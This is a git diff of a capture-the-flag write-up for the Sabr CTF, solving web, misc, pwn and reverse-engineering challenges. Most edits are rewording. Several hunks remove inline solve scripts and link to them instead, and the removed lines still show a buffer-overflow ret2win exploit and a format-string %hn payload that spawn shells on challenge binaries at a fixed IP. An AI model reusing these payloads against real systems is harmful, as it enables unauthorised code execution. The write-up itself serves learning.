@@ -58,7 +58,7 @@ We can see there’s a cookie present and its encoded now lets decode the value 
 
 But also if we notice the end of the flag cookie we see its url encoded
 
-So here’s the decoding from cyberchef
+Here’s the decoding from cyberchef
 
 ![1](https://raw.githubusercontent.com/markuched13/markuched13.github.io/main/posts/ctf/sabr/images/web/seikooc/5.png)
 
@@ -67,80 +67,29 @@ Flag: sabr{c00k13s_sh0uld_4lw4ys_b3_ch3ckEd!!!}
 ### Tunnel Vision:
 ![1](https://raw.githubusercontent.com/markuched13/markuched13.github.io/main/posts/ctf/sabr/images/web/tunnelvision/1.png)
 
-So on navigating to the web page we get two links to click.
+On navigating to the web page we get two links to click.
 
 ![1](https://raw.githubusercontent.com/markuched13/markuched13.github.io/main/posts/ctf/sabr/images/web/tunnelvision/2.png)
 
 Checking source code doesn’t really reveal anything. So lets check the links out.
 
-On clicking the first link I got redirected to a page that shows `nope:)`
+After clicking the first link I got redirected to a page that shows `nope:)`
 
 ![1](https://raw.githubusercontent.com/markuched13/markuched13.github.io/main/posts/ctf/sabr/images/web/tunnelvision/3.png)
 
-So I checked the second link but instead this shows another page that has 2 links again
+I checked the second link but instead this shows another page that has 2 links again
 
 ![1](https://raw.githubusercontent.com/markuched13/markuched13.github.io/main/posts/ctf/sabr/images/web/tunnelvision/4.png)
 
-So I kept on clicking and it kept on redirecting to a new page that has new links to click or it shows `nope`.
+I kept on clicking and it kept on redirecting to a new page that has new links to click or it shows `nope`.
 
-So obviously scripting your way out is the best thing to do. I read lots from stackoverflow questions and past ctfs to be able to generate this working exploit code written in python.
+Obviously scripting your way out is the best thing to do. I read lots from stackoverflow questions and past ctfs to be able to generate this working exploit code written in python.
 
-```
-import requests
-from bs4 import BeautifulSoup
+Here's the solve script [Solve](https://github.com/markuched13/markuched13.github.io/blob/main/solvescript/sabr/web/tunnel_vision.py)
 
-# Starting URL
-url = 'http://13.36.37.184:45260'
+Basically what the script does is to loop the connection made to the web server then finds each path in the web source code which is then stored in the paths variable and also if no path if found then the code breaks.
 
-# Flag variable to indicate if the correct path is found
-flag = False
-
-# list of path values
-paths = []
-
-while True:
-    # getting the page
-    response = requests.get(url)
-    soup = BeautifulSoup(response.text, 'html.parser')
-    print(f'Getting page from: {url}')
-    
-    # find the path on the page
-    links = soup.find_all('a')
-    paths = [link.get('href') for link in links if 'path=' in link.get('href')]
-    
-    # if no path found break the loop
-    if not paths:
-        print(f"The flag is: {response.text}")
-        break
-    print(f'Found {len(paths)} possible paths: {paths}')
-    
-    # iterate through all possible path values
-    for path in paths:
-        # Construct the URL with the current path value
-        url = 'http://13.36.37.184:45260/' + path
-
-        # Send a GET request to the URL
-        response = requests.get(url)
-        
-        # If we hit a dead end, try the other path
-        if "nope" in response.text:
-            print("Sorry, you have reached a dead end. Please retry")
-            paths.remove(path)
-            url = 'http://13.36.37.184:45260' + paths[0]
-            continue
-
-        # Check the response for the flag
-        if "sabr{" in response.text:
-            print(f"The flag is: {response.text}")
-            flag = True
-            break
-        else:
-            print(f'Trying path: {path}...')
-```
-
-So basically what the script does is to loop the connection made to the web server then finds each path in the web source code which is then stored in the paths variable and also if no path if found then the code breaks.
-
-So after that a for loop is called which will iterate the values stored in the path variable and perform a get request with the new path then it check if nope is in the response and if it is indeed there it removes the nope path and attempt to use another path.
+After that a for loop is called which will iterate the values stored in the path variable and perform a get request with the new path then it check if nope is in the response and if it is indeed there it removes the nope path and attempt to use another path.
 
 Then the loop keeps on going till it finds `sabr{` in the response which is the flag format per se, after it does that it will then print out the content of the response.
 
@@ -207,7 +156,7 @@ But on checking the source code we have a base64 encoded blob
 
 ![1](https://raw.githubusercontent.com/markuched13/markuched13.github.io/main/posts/ctf/sabr/images/web/wargamez/5.png)
 
-So I copied and saved the encoded blob on my machine to do the decoding.
+I copied and saved the encoded blob on my machine to do the decoding.
 
 ```
 ┌──(mark㉿haxor)-[~/…/CTF/Sabr/web/wargamez]
@@ -233,7 +182,7 @@ Flag: sabr{w3lc0m3_t0_th3_w0rld_0f_w4rg4m3s}
 ### Sanity:
 ![1](https://raw.githubusercontent.com/markuched13/markuched13.github.io/main/posts/ctf/sabr/images/misc/sanity/1.png)
 
-This just checks whether you are sane 😂
+This just checks whether you are sane i think 🤔
 
 Flag: sabr{Welcome_To_Sabr_CTF}
 
@@ -440,22 +389,9 @@ Nice it also was able to add any number we specify to any register from here we 
 You Win, Flag is sabr{S1MPL3_STACK_M4CH1N3}
 ```
 
-So here’s my python script to initialize the connection then do the evaluations and also call the win function
+Here’s my python script to initialize the connection then do the evaluations and also call the win function [Solve](https://github.com/markuched13/markuched13.github.io/blob/main/solvescript/sabr/misc/simplemachine.py)
 
-It might take few seconds to print the flag
 
-```
-#!/usr/bin/python2
-from pwn import *
-io = remote("13.36.37.184", 9099)
-
-io.sendline("xor x1 4919")
-io.sendline("regs")
-io.send("win")
-io.send("\n")
-io.interactive()
-io.close()
-```
 
 ![1](https://raw.githubusercontent.com/markuched13/markuched13.github.io/main/posts/ctf/sabr/images/misc/simplemachine/scriptresult.png)
 
@@ -464,7 +400,7 @@ Flag: sabr{S1MPL3_STACK_M4CH1N3}
 ### Complex machine:
 ![1](https://raw.githubusercontent.com/markuched13/markuched13.github.io/main/posts/ctf/sabr/images/misc/complexmachine/1.png)
 
-So we’re given a remote service to connect to also lets check it out and note from the description is that we should call either win or flag function.
+We’re given a remote service to connect to also lets check it out and note from the description is that we should call either win or flag function.
 
 On connecting to it we see just like the previous simple machine cli but this time it has more commands that can be run.
 
@@ -731,28 +667,7 @@ And I got the flag.
 
 Here’s my python script i used to solve it
 
-It might take few seconds for it to print the flag
-
-```
-#/usr/bin/python2
-
-from pwn import *
-io = remote('13.36.37.184',9092)
-bytes = 'a'*256
-
-#sending the required param
-io.sendline("xor x0 4919")
-
-#over write the echo function
-io.sendline("login "+bytes+"win")
-io.sendline("regs")
-io.sendline("call win")
-io.send("\n")
-
-#making the output interactive
-io.interactive()
-io.close()
-```
+It might take few seconds for it to print the flag [Solve](https://github.com/markuched13/markuched13.github.io/blob/main/solvescript/sabr/misc/complexmachine.py)
 
 ![1](https://raw.githubusercontent.com/markuched13/markuched13.github.io/main/posts/ctf/sabr/images/misc/complexmachine/scriptresult.png)
 
@@ -795,17 +710,17 @@ b0fz: hello
 
 We see it just prints out a banner then takes in our input and exits
 
-So i then de-compiled it using ghidra to analyze the functions in it
+I then decompiled the binary using ghidra to analyze the functions in it
 ![1](https://raw.githubusercontent.com/markuched13/markuched13.github.io/main/posts/ctf/sabr/images/pwn/0v3reZ/4.png)
 
 Now lets view the functions present but since its stripped we won’t exactly see the real function names.
 
 ![1](https://raw.githubusercontent.com/markuched13/markuched13.github.io/main/posts/ctf/sabr/images/pwn/0v3reZ/5.png)
 
-So on checking the content of each functions I saw this in FUN_00401200 which is likely the main function.
+On checking the content of each functions I saw this in FUN_00401200 which is likely the main function.
 ![1](https://raw.githubusercontent.com/markuched13/markuched13.github.io/main/posts/ctf/sabr/images/pwn/0v3reZ/6.png)
 
-So let me try to rename it to how its likely going to look like in the real c code
+Let me try to rename it to how its likely going to look like in the real c code
 
 ```
 int main(void)
@@ -979,47 +894,13 @@ Using ghidra we can see the address by checking the function FUN_004011d6
 
 Address = 0x4011de
 
-Now I made an exploit to run the binary and exploit it here’s my script below
-
-```
-#!/usr/bin/python2
-from pwn import *
-
-#start the process either locally or remotely
-io = process('./0v3reZ')
-#io = remote('13.36.37.184',61000)
-
-#cause the buffer overflow and making an address for it to return 
-padding = "A" * 40 #amount of bytes * offset
-addr = p64(0x4011de) #this address calls /bin/sh
-payload = padding + addr 
-
-#send the payload
-io.send(payload)
-io.interactive()
-```
+Now I made an exploit to run the binary and exploit it here’s my script [Exploit](https://github.com/markuched13/markuched13.github.io/blob/main/solvescript/sabr/pwn/0v3reZ.py) 
 
 Then on running it
 ![1](https://raw.githubusercontent.com/markuched13/markuched13.github.io/main/posts/ctf/sabr/images/pwn/0v3reZ/9.png)
 
-So it worked now lets run this on the remote server here’s my script below
+It worked on the remote server also 
 
-```
-from pwn import *
-
-#start the process either locally or remotely
-#io = process('./0v3reZ')
-io = remote('13.36.37.184',61000)
-
-#cause the buffer overflow and making an address for it to return 
-padding = "A" * 40 #amount of bytes * offset
-addr = p64(0x4011de) #this address calls /bin/sh
-payload = padding + addr 
-
-#send the payload
-io.send(payload)
-io.interactive()
-```
 ![1](https://raw.githubusercontent.com/markuched13/markuched13.github.io/main/posts/ctf/sabr/images/pwn/0v3reZ/10.png)
 
 Flag: sabr{m3m0ry_c0rrup710n_iz_fUNNNNNNNNNNNN}
@@ -1242,31 +1123,11 @@ Now we have the neccessary addresses
 
 Now the payload creation:
 
-Here, we’ll write 080491fa ("/bin/bash") in two parts, the low order bytes the and the high order bytes 
+I’ll write 080491fa ("/bin/bash") to overwrite the value of exit() 0804c028 
 
-Those bytes should be wrote at 0804c028, the call to exit(). 
+Here's the resource which helped me [Resouce](https://axcheron.github.io/exploit-101-format-strings/)
 
-Here's the resource which helped me https://axcheron.github.io/exploit-101-format-strings/
-
-I can't really explain what i don't know im sorry about that but here's what I gathered after reading it
-
-```
-run < <(python -c 'print "\x28\xc0\x04\x08%7$n"')
-
-Low order bytes = 91fa (37370 in decimal)
-High order bytes = 0804 (2052 in decimal)
-
-High order bytes = 0804 (2052 -8) = 2044
-Low order bytes = 91fa (37370 - 2052) = 35318
-
-0x0804c02a
-
-python -c 'print "\x2a\xc0\x04\x08\x28\xc0\x04\x08%2044x%7$hn%35318x%8$hn"'
-```
-
-So basically our final payload is `python -c 'print "\x2a\xc0\x04\x08\x28\xc0\x04\x08%2044x%7$hn%35318x%8$hn"'` 
-
-We can run it then output it in a file `python -c 'print "\x2a\xc0\x04\x08\x28\xc0\x04\x08%2044x%7$hn%35318x%8$hn"' > payload`
+Solve script available here [Exploit](https://github.com/markuched13/markuched13.github.io/blob/main/solvescript/sabr/pwn/fsbez.py)
 
 ```                                         
 ┌──(venv)─(mark㉿haxor)-[~/…/CTF/Sabr/pwn/fsbeZ]
@@ -1313,31 +1174,6 @@ drwxr-xr-x 8 mark mark    4096 Jan 14 13:14 ..
 -rw-r--r-- 1 mark mark      32 Jan 16 22:08 payload
 -rw-r--r-- 1 mark mark    1024 Jan 15 00:38 .testexploit.py.swp
 ```                                                       
-
-So here's my exploit script that would also grants us shell
-
-```
-#!/usr/bin/python2
-
-from pwn import *
-
-io = process('./fsbeZ')
-#io = remote("13.36.37.184", 62000)
-
-high_bytes = 2044
-low_bytes = 35318
-
-#Convert high_bytes and low_bytes to strings
-high_bytes = str(high_bytes)
-low_bytes = str(low_bytes)
-
-#Construct the payload
-payload = p32(0x0804c021) + p32(0x0804c028) + "%" + high_bytes + "x%7$hn%" + low_bytes + "x%8$hn"
-
-io.send(payload)
-io.interactive()
-```
-
 And after running the exploit code we get shell xD 
 
 
@@ -1431,7 +1267,7 @@ But now its encoded but not just encoded it doesn't seems arranged.
 
 What I then did was that i assumed that since the flag format is `sabr{` which has 4 bytes before `{` I then did something quite silly but it worked only that it took some minutes.
 
-I made a python script which would print out all the alphabets in the string then return the output as a list
+I made a python script which would print out all the alphabets in the string then return the output as a list [Rearrange](https://github.com/markuched13/markuched13.github.io/blob/main/solvescript/sabr/re/bandit/rearrange.py)
 
 ```
 #!/usr/bin/python3
@@ -1457,7 +1293,7 @@ which is the same as `(x -84) % 26 + 97` where x represents each character
 
 So I then tried using a python script which will find each value of the encoded characters using the mathematical operation above neglecting characters '{', '_' and '}'
 
-Here's the script 
+Here's the script [Decode](https://github.com/markuched13/markuched13.github.io/blob/main/solvescript/sabr/re/bandit/decode.py)
 
 ```
 array = ['n', 'e', 'g', '{', 'e', 'o', 'n', 'f', 'n', 'q', 'a', 'n', 'c', '_', 'u', 'f', 'h', 'p', '_', 'r', 'e', 'n', '_', 'f', 'r', 'g', '}']
